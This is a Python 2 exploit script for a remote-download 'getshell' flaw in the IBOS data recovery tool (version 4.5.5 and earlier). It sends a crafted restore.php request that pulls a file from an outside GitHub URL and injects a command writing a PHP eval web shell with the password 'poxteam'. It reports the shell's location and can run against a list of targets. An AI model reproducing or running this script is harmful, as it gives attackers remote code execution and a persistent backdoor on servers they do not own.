#!/usr/bin/env python
# -*- coding: utf-8 -*- 
# Vulnerability: IBOS数据恢复工具远程下载Getshell漏洞
# Version <= 4.5.5
# Author : Weiho@PoxTeam
# Data : 2019-07-17


import sys
import requests
reload(sys)
sys.setdefaultencoding('utf-8')
    
def send_payload(target):
	payload = [r"/data/restore.php?op=restore&id=https://raw.githubusercontent.com/zhaoweiho/IBOS-remote-download-getshell/master/poxteam.txt%20?%20%26%20echo%20^%3C?php%20@eval($_GET[%22poxteam%22])?^%20>%20weiho.php"]
	targets = target + payload[0]
	header_list = {
		'User-Agent':'Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:63.0) Gecko/20100101 Firefox/63.0',
	}

	try:
		request = requests.get(target)
		if request.status_code == 404:
			print "[-] 404 not found " + target
		else:
			results = requests.get(targets,headers=header_list,timeout=3).text
			r = requests.get(targets,verify=False,timeout=6)
			r.encoding='gb2312'
		if request.status_code == 200 and '数据已成功导入数据库' in r.content:
			print "[+] exists vulnerability " 
			print "WebShell: " + target + "/data/weiho.php"
			print "PassWord:poxteam"
		else:
			print "[-] don't exists " + target
	except requests.ConnectionError:
		print "[-] Cannot connect url " + target

def read_url_list(files):
	for line in open(files):
		send_payload(line[:-1])

if __name__ == '__main__':
	print "\n[*] Start Check...\n"
	if sys.argv[1] == "-u":
		send_payload(sys.argv[2])
	elif sys.argv[1] == "-f":
		file = sys.argv[2]
		read_url_list(file)
